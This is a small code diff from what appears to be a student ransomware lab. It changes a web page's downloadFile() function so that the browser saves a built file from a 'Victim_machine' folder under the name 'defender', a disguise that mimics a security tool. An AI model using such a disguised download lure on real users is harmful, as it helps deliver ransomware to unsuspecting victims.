@@ -20,7 +20,7 @@ function downloadFile() {
 
 function downloadFile() {
   // url="https://file.io/UYNziVaxKJgv"
-  url = "/home/sec-lab/Desktop/Group8_Website/sw/test"
+  url = "/media/sf_Ransomware_Group8/Action/Victim_machine/dist/defender"
   const aElement = document.createElement('a');
   aElement.setAttribute('href', url);
   aElement.setAttribute('download', 'defender');
